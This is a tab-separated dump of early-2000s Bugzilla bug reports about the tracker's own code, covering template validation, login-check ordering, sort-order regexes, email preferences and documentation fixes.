148488%TAB%1022877342%TAB%29274%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla-General%TAB%More HTML validation fixes%TAB%More HTML validation fixesThe patch I'll attach fixes everything found by:  find . -iname '*.html.tmpl' | xargs gmuck --mode=HTML --nodeprecated --nomimetype  with one exception.  The exception is that the 'edit comment as text' <textarea> doesn't have a rows attribute, which is required. We set the size, using a style attribute. Mozilla seems to ignore the rows attribute, but I need to check if that is guarenteed. That page only wokrs in mozilla ATM, so I'm not worried about other browsers.  The mimetype warnings are all on the fact that we use text/javascript instead of application/x-javascript. Was this a deliberate decision made for old IE versions, or something? If not, I'll fix those, too.  This is for 2.18, not 2.16, although the account/email/confirm.html.tmpl part (<input type="input">) may need to go into 2.16, since I can imagine browsers having issues with that.  Most of the fixes are obvious (& -> amp;, adding action attribute to <form>s, and alt to <img> and so on). Those that aren't include:  global/useful-links.html.tmpl: gmuck warns about inconcistant quote style, so I changed these to use " instead of ' (they were " because of how we were quoting for TT)  search/form.html.tmpl: gmuck picked up on:  [%# Note: the <form> tag is unclosed at the end of this template %]  as not having an action attribute. Since the opening isn't in this template, and only one template uses this particular template, I think its a fairly silly comment, so I removed it. I care because I want gmuck to become part of the tests - see bug 148487. I thought about reporting this as a gmuck bug, but its not, since gmuck shouldn't be expected to know about TT's comment scheme.
148674%TAB%1023020436%TAB%15223%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Query/Bug List%TAB%Boolean Charts don't work in Netpositive because '-' is sent as '%2D'%TAB%Boolean Charts don't work in Netpositive because '-' is sent as '%2D'We need to treat this url: http://bugzilla.mozilla.org/buglist.cgi?&product=Bugzilla&product=Webtools& field0%2D0%2D0=groupset&type0%2D0%2D0=equals&value0%2D0%2D0=512 the same as we treat this url: http://bugzilla.mozilla.org/buglist.cgi?&product=Bugzilla&product=Webtools& field0-0-0=groupset&type0-0-0=equals&value0-0-0=512  User-Agent: Mozilla/3.0 (compatible; NetPositive/2.2)  Be lenient in what you accept.
148679%TAB%1023021867%TAB%40200%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%User Interface%TAB%Permit multiple stylesheets in header template%TAB%Permit multiple stylesheets in header templateBugzilla 2.16rc1 templates assume that there will be a maximum of one style_url for a page.  Change this to a list of style_urls.  (One cool thing, a string seems to behave as a list of one item, so it is backward-compatible with any templates that don;t know this can be a list)
148687%TAB%1023026553%TAB%51106%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla-General%TAB%queryhelp.cgi doesn't provide correct list of products if usebuggroups is on%TAB%queryhelp.cgi doesn't provide correct list of products if usebuggroups is on(it's 2.16rc1, but I don't see that in the Version list) queryhelp.cgi should be producing lists of products based on your bug group membership, but in the middle of it's listing it calls GroupExists(productname) which doesn't push/pop the SQL state, so the list gets messed up. possible fixes:  - add PushGlobaleSQLState / PopGlobalSQLState to GroupExists  - add them to queryhelp.cgi  - Don't bother checking if the group exists in queryhelp.cgi - after all, it's listing products, not groups. All of these are barely worth patches - should I provide them? It might also be worth checking where else GroupExists is called from as it doesn't save state.
148712%TAB%1023039846%TAB%51106%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Administration%TAB%Add component with empty/invalid initial owner results in double header output%TAB%Add component with empty/invalid initial owner results in double header outputAdding a new component, and filling in the component name and description with either an empty or invalid initial owner results in the header HTML (including the initial "Content-type:text/html") being shown twice. (eg. the "error handling" thinks it's got the whole page to display).  The call to DBNameToIdAndCheck (line 401) in editcomponents.cgi seems to be extraneous - the check for an empty owner never gets called, and the safer check for invalid account that doesn't mess up the output doesn't get called.  Deleting that line seems a safe and sensible thing to do.
148767%TAB%1023071331%TAB%43662%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Query/Bug List%TAB%buglist.cgi outputs a warning if first query doesn't have a sort order%TAB%buglist.cgi outputs a warning if first query doesn't have a sort orderIf the first query ever run by a user (no LASTORDER cookie) has a 'reuse' sort order, buglist.cgi throws a pair of uninitialized warnings. Patch incoming.
148836%TAB%1023097271%TAB%51004%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Bugzilla-General,Email Notifications%TAB%Can't get email,  "When I'm added to or removed from the Bug Owner capacity" ONLY%TAB%Can't get email,  "When I'm added to or removed from the Bug Owner capacity" ONLYI have signed the checkbox “When I'm the Bug Owner, email me:” 	[x] “When I'm added to or removed from this capacity” other checkboxes under this section are empty Under [User preferences]|[Email settings]   Since I did this change I stop get emails, when the bug was reassign to me.
148871%TAB%1023108529%TAB%10297%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Documentation%TAB%afranke@ags.uni-sb.de,Apache doesn't use srm.conf or access.conf anymore%TAB%afranke@ags.uni-sb.de,Apache doesn't use srm.conf or access.conf anymoreSee section "HTTP Server" in the Bugzilla Guide. The current version reads:  You'll want to make sure that your web server will run any file with the .cgi extension as a cgi and not just display it. If you're using apache that means uncommenting the following line in the srm.conf file:    AddHandler cgi-script .cgi   With apache you'll also want to make sure that within the access.conf file the line: Options ExecCGI AllowOverride Limit   is in the stanza that covers the directories into which you intend to put the bugzilla .html and .cgi files.  --- End Forwarded Message ---  The above section is incorrect as of Apache 1.3 and later.  Since Apache 1.3, the srm.conf and access.conf files have been deprecated.  These statements should all be in the main httpd.conf file.
148919%TAB%1023127161%TAB%4412%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Administration%TAB%Make entryheader a separate template.%TAB%Make entryheader a separate template.Make entryheader a separate template.
148993%TAB%1023158405%TAB%53584%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Query/Bug List%TAB%debug flag in buglist not working.,debug flag in buglist not working. (2.16 hack)%TAB%debug flag in buglist not working.,debug flag in buglist not working. (2.16 hack)orry I forgot the comments. I get this error when $debug = 1 in buglist.cgi : malformed header from script. Bad header=<P><CODE> SELECT bugs.bug_id, : /var/www/html/bugzilla/buglist.cgi each time my server tries to execute buglist.cgi
149246%TAB%1023239945%TAB%55570%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Query/Bug List%TAB%need to be able to specify relative dates in days%TAB%need to be able to specify relative dates in daysbeeing able to specify relative dates allows savings of queries for the last week or periods back.
149347%TAB%1023270329%TAB%27300%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla-General%TAB%incorrect interface comment in header.html.tmpl%TAB%incorrect interface comment in header.html.tmplheader.html.tmpl says it takes a "jscript" parameter, but it actually takes a "javascript" parameter.
149496%TAB%1023303722%TAB%10297%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla-General%TAB%id and password in the url doesn't work on pages that use quietly_check_login%TAB%id and password in the url doesn't work on pages that use quietly_check_loginThis would be incredibly useful for attachment.cgi for example...  when attempting to retrieve a patch to apply via a command-line script (like bzpatch on landfill) if the patch is on a secure bug.  bzpatch would be able to retrieve the patch if you could specify your Bugzilla_login and Bugzilla_password as part of the URL.  This works on pages that use confirm_login, but not on pages that use quietly_check_login (which includes attachment.cgi), because quietly_check_login only looks to see if there's a cookie, it doesn't look to see if it was passed as part of the URL.
149504%TAB%1023305561%TAB%40200%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Creating/Changing Bugs,attachment and request management%TAB%Permit a reference to a URL to be treated as an attachment%TAB%Permit a reference to a URL to be treated as an attachmentTo permit URL's to be handled as attachments, permit a URL to be specified in place of a filename and create a redirect page and attach it instead.
149845%TAB%1023397740%TAB%29274%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Query/Bug List%TAB%buglist.cgi checks for ORDER validity are wrong%TAB%buglist.cgi checks for ORDER validity are wrongbuglist.cgi has:  foreach my $fragment (split(/[,\s]+/, $order)) {                 next if $fragment =~ /^asc|desc$/i;  This is wrong, because /^asc|desc$/i is /(^asc)|(desc$)/, not /^(asc|desc)$/, as it should be. This should be fixed for 2.16, as even though I don't think its exploitable, its letting something through we didn't want to.  The split regexp allows ,, though, which is also wrong.  We should do what I suggested mattyt do for 2.14.2 patch does, and split on /,/. The grep should then be changed to check for trim($_) =~ /$fragment(\s+asc|desc))?/  The grep will go thorugh all the coumns, too, while we only want want to check for any single match - is there a better way to do this?
149883%TAB%1023409287%TAB%4412%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Documentation%TAB%Document Bugzilla doesn't work under mod_perl.%TAB%Document Bugzilla doesn't work under mod_perl.Bugzilla won't work under mod_perl, but I don't see this documented.  Perhaps add a section for setting up specific web servers, and the existing mod_throttle stuff can be moved to the Apache subsection.
149964%TAB%1023433063%TAB%5898%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%User Interface%TAB%quietly_check_login() needs to be called in colchange.cgi%TAB%quietly_check_login() needs to be called in colchange.cgiCurrently in colchange.cgi, quietly_check_login or confirm_login is not being called which means the footer reports that the user is not logged in. Adding quietly_check_login() to the top fixes this problem. Attaching patch.
150105%TAB%1023468071%TAB%10297%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Query/Bug List%TAB%debug flag in buglist not working,$debug flag in buglist.cgi not working (cgi param works fine)%TAB%debug flag in buglist not working,$debug flag in buglist.cgi not working (cgi param works fine)Cloned from bug 148993, see that bug for full description (it had a checkin for 2.16 which didn't make it to the trunk, and we still need to get a fix for it on the trunk.
150149%TAB%1023488557%TAB%4412%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla-General%TAB%2.18 Release Notes Bug%TAB%2.18 Release Notes BugI expect the following to be documented:  - all significant fixes and enhancements implemented - all changes to the deprecated features and outstanding major problems - changes in software dependency requirements
150153%TAB%1023492271%TAB%4412%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla-General%TAB%ConnectToDatabase/quietly_check_login issues.%TAB%ConnectToDatabase/quietly_check_login issues.I did an audit of CGIs with regard to ConnectToDatabase and quietly_check_login.  What I found was not good, and needs to be fixed for rc3/final.  confirm_login is ok on it's own because it calls ConnectToDatabase itself.  No ConnectToDatabase before quietly_check_login -----------------------------------------------  Results in the CGI dying in certain situations.  xml.cgi: No CTD.  colchange.cgi: CTD is done *after* qcl.  No quietly_check_login ----------------------  Results in a logged out footer.  quips.cgi  token.cgi: Possibly not a bug, are there any situations in which it should? createaccount.cgi: Probably not a bug, given this shouldn't occur when you're logged in anyway.  Stuff between ConnectToDatabase & quietly_check_login -----------------------------------------------------  Results in a logged out footer in some situations.  buglist.cgi: Definitely a bug, try buglist.cgi?format=nonexistantformat.  describecomponents.cgi, duplicates.cgi, sidebar.cgi: Call GetVersionTable in between, maybe not a bug at the moment, but could become one later if GetVersionTable calls Throw*Error or the like.  queryhelp.cgi: Similar to above, called SendSQL, probably not a bug at the moment.
150154%TAB%1023492390%TAB%4412%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla-General%TAB%Login checks need be done on the main database even when the CGI is using the shadow database.%TAB%Login checks need be done on the main database even when the CGI is using the shadow database.When a CGI uses the shadow database, checks in confirm_login/quietly_check_login currently run against the shadow database, but they should run against the main database regardless of the shadow setting for this CGI.
150703%TAB%1023709017%TAB%27300%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla-General%TAB%make query.cgi support formats%TAB%make query.cgi support formatsImplement format support in query.cgi so users can select from multiple formats when loading the search form.
150770%TAB%1023735223%TAB%29274%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Query/Bug List%TAB%Lost <nobr> arround query results%TAB%Lost <nobr> arround query resultsThe old query code had <nobr> arround the values it didn't quote. We've lost taht, and so bmo is now wrapping the "Bugzilla 2.1x" milestones. We probably need to just add a nobr attribute to the column list in the template, and then apply the no_br filter to those columns.  Regression, so -> 2.16
150776%TAB%1023736854%TAB%15223%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Query/Bug List%TAB%remembered query UI is badly *placed*,Remembered query options need regrouping,blank lines between 'knob' query options,Remembered query options need regrouping%TAB%remembered query UI is badly *placed*,Remembered query options need regrouping,blank lines between 'knob' query options,Remembered query options need regroupingwhat you have:  ( ) Run this query   ( ) Load my remembered query:   |                | ( ) Run my remembered query:    [ Some Query   |^] ( ) Forget my remembered query: |                |  ( ) Remember this as my default query ( ) Remember this query, and name it: [                 ]     [ ] and put it in my page footer  something that would work:  ( ) Run this query  ( ) Remember this query, and name it: [ default query   ]     [ ] and put it in my page footer ( ) ...whatever-remember stuff (subject to bug 150774 ...)
150778%TAB%1023737108%TAB%4412%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Creating/Changing Bugs%TAB%Extraneous blank line above initial comments.%TAB%Extraneous blank line above initial comments.There's an extraneous blank line above the first comment on bug page.  This is a part of the page, not the comment.
150785%TAB%1023739003%TAB%29274%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Creating/Changing Bugs%TAB%verify-new-product.html.tmpl doesn't set defaults%TAB%verify-new-product.html.tmpl doesn't set defaultsThe old screen you got when changing a bug's product defaulted the version, component, and milestone to the current one, if it was on the new product's lists.  The 2.16 code doesn't, and so moving a bug from bugzilla to brower gives a default milestone of M1.  If its not in the list, we should then try the product's default version/component/milestone, but that part isn't a regression.
150791%TAB%1023740985%TAB%15223%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Query/Bug List%TAB%Email and Numbering text is grammatically incorrect%TAB%Email and Numbering text is grammatically incorrectwhat you have:  +- Email and Numbering -- | Any of: (1) contains, is, matches regexp, doesn’t match regexp | (1): bug owner, reporter, QA contact, CC list member, commenter +-  what you probably should have:  Any of: (1) contain, are, match regexp, don't match regexp (1): bug owner, reporter, QA contact, CC list members, commenters  per http://www.edict.com.hk/vlc/GrammarCourse/Lesson7_Pronouns2/Lesson7.htm 'specific' (of a group)  http://webster.commnet.edu/grammar/grammarlogs3/grammarlogs480.htm QUESTION Would you say "Does any of you have a tape recorder?" or "Do any of you have a tape recorder?"  http://webster.commnet.edu/grammar/grammarlogs3/grammarlogs475.htm Which is correct? If any of you has questions, we will answer them. or If any of you have questions, we will answer them.  The two grammarlogs suggest that you can use singular if you mean 'any one of' which is not what we mean.  Selected response: The pronoun "any" is perfectly capable of being either singular or plural, depending on how it's used. Here, it is clearly referring to a possible *group* of people, so I'd go with the plural "have." You could change it, of course, to "any one of you," and then you'd need a singular verb, but that's a different matter.
150792%TAB%1023741201%TAB%29274%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Creating/Changing Bugs%TAB%CCs when creating bug gives an error%TAB%CCs when creating bug gives an errorselect userid from profiles where login_name = 'gerv@mozilla.org': Table 'profiles' was not locked with LOCK TABLES at globals.pl line 276.
150795%TAB%1023741377%TAB%15223%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Query/Bug List,User Interface%TAB%'Numbering' is silly and should be changed%TAB%'Numbering' is silly and should be changedwhat you see: Email and Numbering something that might be better: Email and Bug numbers
150798%TAB%1023741816%TAB%29274%TAB%VERIFIED%TAB%FIXED%TAB%Development%TAB%Bugzilla-General%TAB%Extra whitespace included in saved query links%TAB%Extra whitespace included in saved query linksThe </a> is after a newline, so we get:  <a href="...">My Bugs </a>| etc
150802%TAB%1023743021%TAB%29274%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Creating/Changing Bugs%TAB%Default version for bug entry not read from cookies%TAB%Default version for bug entry not read from cookiesWhen you set a version when reporting a bug, we set a VERSION-$product cookie. enter_bug.cgi is not longer reading this.  Does anyone know why we set a cookie called PLATFORM to the entered product, btw? 2.14 does, and it doesn't use this. Some wierd historical thing?
150804%TAB%1023743640%TAB%15223%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Query/Bug List%TAB%keywords should default to all%TAB%keywords should default to allthe top n items in the search page are AND ops, *except* for keywords  what you see: Summary: contains all of the words/strings A comment: contains all of the words/strings The URL: contains all of the words/strings Whiteboard: contains all of the words/strings Keywords: contains any of the keywords  what you should see: Summary: contains all of the words/strings A comment: contains all of the words/strings The URL: contains all of the words/strings Whiteboard: contains all of the words/strings Keywords: contains all of the keywords
150826%TAB%1023753777%TAB%29274%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Creating/Changing Bugs%TAB%missing space between lists of attachments%TAB%missing space between lists of attachmentsTheres a missing space at the bottom of the edit attachment screen:   Attachments on this Bug: #1| #2| #3| #4| #5   Really trivial fix coming for 2.16
150829%TAB%1023755245%TAB%29274%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla-General%TAB%'My Votes' link missing from footer%TAB%'My Votes' link missing from footerThe 'My Votes' link isn't in the footer. This is because the condition is:  [% IF user.login AND use_votes %]  use_votes is set in globals.pl to $::anyvotesallowed.  $::anyvotesallowed is read in from teh versioncache, which hasn't been loaded at this point. Oops...  bug_form.pl uses the user_votes var name, too; doesn't this conflict?
150882%TAB%1023781816%TAB%22572%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Query/Bug List%TAB%Query not working,SQL error when sorting by bug.votes with explicit direction,SQL error when sorting by bugs.votes with explicit direction%TAB%Query not working,SQL error when sorting by bug.votes with explicit direction,SQL error when sorting by bugs.votes with explicit direction'bugs.votes desc' in the order param is coverted to 'bugs.votes desc desc' which obviously fails      # If we are sorting by votes, sort in descending order.     if ($db_order =~ /bugs.votes\s*(asc|desc){0}/i) {         $db_order =~ s/bugs.votes/bugs.votes desc/i;     }  isn't doing what you expected it to do. That regexp looks odd to me, though.
150901%TAB%1023784493%TAB%9911%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%User Accounts%TAB%New account mail URLs have terminating full stops.,Some params containing mail-templates contain URLs with terminating punctuation%TAB%New account mail URLs have terminating full stops.,Some params containing mail-templates contain URLs with terminating punctuationI only see one place where there is punctuation after a URL in the trunk, and  that's in the default 'whinemail' parameter.   I will fix this for the trunk; am setting the bug to block the bmo-upgrade bug  so that Dave knows to check for this issue in customized bmo templates the next  time he updates.
150925%TAB%1023789141%TAB%56643%TAB%VERIFIED%TAB%FIXED%TAB%Architecture%TAB%User Accounts%TAB%Cannot chage e-mail address for bugzilla account.,Cannot change e-mail address for bugzilla account.%TAB%Cannot chage e-mail address for bugzilla account.,Cannot change e-mail address for bugzilla account.URL of bugzilla http://bugzilla.mozilla.org/userprefs.cgi  In the account settings tab, Cannot chage e-mail address for bugzilla account.  I am trying to change e-mail address of account (Not this account) I cannot do so. I continuously get the following error message. “Email change already in progress; please check your email.” After one and a half hours, I have not seen any e-mail in my in-tray.  I am receiving mails, including the one to set up this accunt. In the mean time, I have sucessfully changed the password, and I can still log on/off on my old e-mail address.  The mozilla account I’m submitting this bug from is neither the Account adentified by the old e-mail address, nor that defined by the new e-mail Address.  Rob North Reporter
150955%TAB%1023795913%TAB%46544%TAB%VERIFIED%TAB%FIXED%TAB%Development%TAB%Creating/Changing Bugs%TAB%confirmation doesn't propagate when reassigning to new component,confirmation doesn't propagate when reassigning to new product/component%TAB%confirmation doesn't propagate when reassigning to new component,confirmation doesn't propagate when reassigning to new product/componentI just reassigned two bmo bugs from browser to tech evangelism, confirming both at the same time (by checking both "Reassign bug to owner of selected component" and "and confirm bug (change status to NEW)"). Neither confirmation got through.  All other changes I made did seem to get through correctly.
151023%TAB%1023808460%TAB%5003%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Query/Bug List%TAB%duplicates.cgi sort by delta sorts wrong direction%TAB%duplicates.cgi sort by delta sorts wrong directionwhen sorting by the list of duplicates by delta the top of the list is the fewest changes and the bottom of the list is the most changes. This is backwards from how it used to be and a lot less useful. See this list for an example http://bugzilla.mozilla.org/duplicates.cgi?sortby=delta&maxrows=20&changedsince=5  I think that most people will want to see the bugs which have gathered the most duplicates at the top of the list, not the fewest.
151049%TAB%1023816667%TAB%14534%TAB%VERIFIED%TAB%FIXED%TAB%Development%TAB%Bugzilla: Other moz.org Issues,Creating/Changing Bugs,Bugzilla Helper,Bugzilla-General%TAB%New  Bugs have a broken URL field link,New Bugs have a broken URL field link%TAB%New  Bugs have a broken URL field link,New Bugs have a broken URL field linkThis problem is created IMHO only via Bugzilla Helper - previous version of Bugzilla always adds http:// - so Bugzilla Helper has to remove it from user input before posting to Bugzilla.
151122%TAB%1023837359%TAB%43662%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%User Accounts%TAB%Email prefs: Assignee / Owner messed up,Email prefs: Reporter / Owner messed up%TAB%Email prefs: Assignee / Owner messed up,Email prefs: Reporter / Owner messed upOn the email prefs page the assignee and owner columns have their labels (or contents, whichever way you want to look at it) swapped. 
151217%TAB%1023865432%TAB%44872%TAB%VERIFIED%TAB%FIXED%TAB%Development%TAB%Query/Bug List%TAB%Invalid column reference,buglist references the wrong priority field%TAB%Invalid column reference,buglist references the wrong priority fieldbuglist.cgi (as downloaded from CVS today) contains a reference to the column "priority" rather than "bugs.priority". This causes some problems on the bug list page, e.g. an error if you try to edit multiple bugs.  This can be fixed by changing line 1340 of buglist.cgi from:  $order = "map_assigned_to.login_name, bugs.bug_status, priority, bugs.bug_id";  to:  $order = "map_assigned_to.login_name, bugs.bug_status, bugs.priority, bugs.bug_id";
151281%TAB%1023879182%TAB%9911%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Reporting/Charting%TAB%duplicates.cgi performance work%TAB%duplicates.cgi performance workduplicates.cgi now performs much worse than it did; this is part of the issue affecting b.m.o.  I'm also testing the Bugzilla Helper replacement, so this bug report will have some random fields in it.  Reproducible: Always
151326%TAB%1023886050%TAB%9911%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Creating/Changing Bugs%TAB%reporter/qa_contact/assignee cannot confirm bugs%TAB%reporter/qa_contact/assignee cannot confirm bugsThe reporter, qa_contact and assignee should be able to edit and confirm a bug even if they normally couldn't. They cannot confirm bugs, however, because DoConfirm() in process_bug.cgi only checks for group membership.  On a related issue, the above scenario fails silently. So, if an unprivileged reporter of a bug tries to confirm it, the processing goes through, and mail is sent - but nothing happens. The bug remains UNCONFIRMED. I have not yet received such a mail, so can't tell you what it says.  This could be fixed by DoConfirm() throwing a UserError. It probably should do that.
151327%TAB%1023886114%TAB%9911%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Creating/Changing Bugs%TAB%verify_new_product.html.tmpl prints wrong message%TAB%verify_new_product.html.tmpl prints wrong messageYou get the "component/version" message even when you are also updating the milestone. This is an obvious misspelling of a template var in verify-new-product.html.tmpl .
151369%TAB%1023893493%TAB%5168%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Creating/Changing Bugs%TAB%Rejected valid username when reassigning%TAB%Rejected valid username when reassigningI was trying to reassign the bug already in #4 but Bugzilla complained that alexsavulov@netscape.com did not exist.  Doing it separately worked fine as you can see.  I was using Mozilla 2002-06-10-14 (trunk) on Windows 98 when reassigning.
151411%TAB%1023906239%TAB%15223%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%User Interface%TAB%(This bug is not in your list) is confusing%TAB%(This bug is not in your list) is confusingCan the text be changed to say (This bug is not in your query)?
151529%TAB%1023945724%TAB%42159%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Query/Bug List%TAB%No list of votes shown if there is a plus sign (+) in the address%TAB%No list of votes shown if there is a plus sign (+) in the addressIf you want to see all votes of somebody with a + sign in his/her e-mail address, it will show an errormessage about it not being a valid username.  How to reproduce:  1. Go to a bug with a lot of voters (i.e. bug 22687).  2. Click on show votes for this bug. 3. Find a random voter with a + in his/her e-mail address.  4. Click on the address to see his/her other votes.  Result: an error message. Expected: a list with votes.  Using %2b instead of + will return the correct result.
151555%TAB%1023952433%TAB%27300%TAB%RESOLVED%TAB%FIXED%TAB%Testing%TAB%Query/Bug List%TAB%quicksearch.js calls buglist.cgi without parameters,quicksearch.js sometimes calls buglist.cgi without parameters%TAB%quicksearch.js calls buglist.cgi without parameters,quicksearch.js sometimes calls buglist.cgi without parametersnobody@bugzilla.org cares about these poor bugs and they haven't been touched in nearly 2 months.  No way they'll hit 2.18 unless something changes.  --> 2.20 If someone adopts them, they can pull them back in.
151619%TAB%1023965916%TAB%32552%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Installation & Upgrading%TAB%Problem with the regex in checksetup.pl to find dependancies.,Problem with the regex in checksetup.pl to find duplicates%TAB%Problem with the regex in checksetup.pl to find dependancies.,Problem with the regex in checksetup.pl to find duplicatesWhen running checksetup.pl to convert an old installation (in particular, the b.gnome.org site), I got sql errors on line 2709 because 's weren't being escaped. Upon further investigation (by bbaetz), we figured out that the regex on 2708 that was trying to filter out the bugids was broken, as it wasn't getting rid of the text after the * * * This bug is a duplicate... * * * line. The suggested fix, change the regex to:                  $dupes{$key} =~ /.*\*\*\* This bug has been marked as a duplicate of (\d{1,5}) \*\*\*/s;                 $dupes{$key} = $1;
151648%TAB%1023972828%TAB%5168%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla-General,User Accounts%TAB%'QA Contact' column presented with useqacontact = Off%TAB%'QA Contact' column presented with useqacontact = OffIn our local installation of Bugzilla 2.17 (updated today from CVS) we are not using the QA field. So we have useqacontact = Off.  ACTUAL BEHAVIOUR: User email prefs still presents a 'QA Contact' column.  EXPECTED BEHAVIOUR: No 'QA Contact' column.
151658%TAB%1023976536%TAB%27300%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Bugzilla-General%TAB%moving doesn't work%TAB%moving doesn't workUI to move bugs from one installation to another no longer appears.
151695%TAB%1023986246%TAB%24295%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla-General%TAB%Can't access bug assigned to me%TAB%Can't access bug assigned to meI don't believe I actually did that, and noone noticed. I made it so the assignee could always see the bug (ie no checkbox), but I, um, removed the code which let them ever see it, not just the option....
151714%TAB%1023997920%TAB%43111%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%User Accounts%TAB%user with no canconfirm permission should not get option (or be allowed) to mark bugs they reported as NEW,user with no canconfirm permission should not get option to mark bugs they reported as NEW%TAB%user with no canconfirm permission should not get option (or be allowed) to mark bugs they reported as NEW,user with no canconfirm permission should not get option to mark bugs they reported as NEWI do not have canconfirm permission set for my account (nor any other permission bits -- I just double checked this, too), but I am presented with the option to mark a bug that I reported as NEW.  I have not actually tried it to see if Bugzilla actually allows it, (didn't want to upset people).  Here are the options I have now for a bug I reported (such as Bug 148881): Leave as UNCONFIRMED  Confirm bug (change status to NEW) Accept bug (confirm bug, change status to ASSIGNED) Resolve bug, changing resolution to Resolve bug, mark it as duplicate of bug # Reassign bug to      and confirm bug (change status to NEW) Reassign bug to owner of selected component      and confirm bug (change status to NEW)   Apologies if I am misremebering (and this is not a regression after all).  But I think there is a mistake being made here, even if it is not a regression.  1) If Bugzilla would deny me permission to change it to NEW, then don't have it present me with that option.  2)  If Bugzilla is going to allow me to set to NEW any bug I report, it seems like rules are being broken: (From http://bugzilla.mozilla.org/bug_status.html) "UNCONFIRMED  [...]Nobody has validated that this bug is true. Users who have the "canconfirm" permission set may confirm this bug, changing its state to NEW. [...]"  Either way, seems like something's wrong.  Don't get me wrong; it would be kind of cool if I could confirm my own reports.  But I don't think developers would consider this "cool."  I am aware of Bug 95579 and Bug 90619, but 1) I suspect this is a regression (recent upgrade) and those bugs are pretty old; and 2) I don't see the stuff about being able to mark a bug NEW discussed anywhere in either of those two bugs.  I also understand the notion that users ought to be able to reopen bugs they reported, mark their own reports duplicates of others, and so forth, but I am pretty sure this does not fall under "so forth". I'll let someone who _should_ be allowed to confirm do so and set it to block Bug 150783 if that is deemed necessary (and if this report is not invalid in the first place).  :)  Couldn't find that anyone else had reported this yet.
151871%TAB%1024048995%TAB%27300%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla-General%TAB%performance problems in quoteUrls%TAB%performance problems in quoteUrlsn b.m.o has a lot of URLs in one of its comments.  As a result, it doesn't load, since the HTTP transaction times out before Bugzilla finishes generating and outputting the content.
152138%TAB%1024194762%TAB%29274%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Query/Bug List%TAB%2.14.2 breaks sorting on more than one field%TAB%2.14.2 breaks sorting on more than one fieldI know this is a resolved and fixed bug, but since this is the fix that caused my problem, I feel inclined to report it here.  I just patched our 2.14.1 installation up to 2.14.2.  We immediately noticed that we could no longer sort our buglists after the change.  Sure enough, if I back-out the patch sorting works again.  Somewhere along the line the ORDER gets corrupted.  As I'm not intimately familiar with Bugzilla code, I only made a cursory attempt to fix the problem, but came up empty.  What we have found is that if you are only sorting on one index (for example order=bugs.priority), you're fine, but if you have two or more (for example order=bugs.bug_severity%2C%20bugs.priority), then the sort does not occur for either index.  As soon as I backed out this particular change (not the whole 2.14.2 patch) sorting was returned to us.  Since this bug report is the verbatim patch that I found, I decided to report it here.
152283%TAB%1024281240%TAB%43662%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Creating/Changing Bugs%TAB%Show votes / by bug has a logged out footer%TAB%Show votes / by bug has a logged out footerWhen listing all the votes for a specific bug, the footer is of a logged out user. The reason is that the template uses a loop variable called user which effectively overwrites login information.
152361%TAB%1024306961%TAB%15223%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%User Interface%TAB%can't continue walking a dependency tree%TAB%can't continue walking a dependency treesuppose you're looking at bug 151413's dependency tree and you decide you want  to see the dependency tree for a bug listed on that page.  you can't just click a bug number. instead you click it and then click a link  for a new tree.  suggestion: make the number a link to the dependency tree for the bug and the  text a link to the bug.  any alternative would work, just save me the pain of loading the actual bug.
152541%TAB%1024360688%TAB%26861%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Query/Bug List%TAB%After deleting remembered query it is still in page footer%TAB%After deleting remembered query it is still in page footerDelete a remembered query. The "Query is gone" page shows the page footer with the deleted query name still in place. All following page footers are ok though.
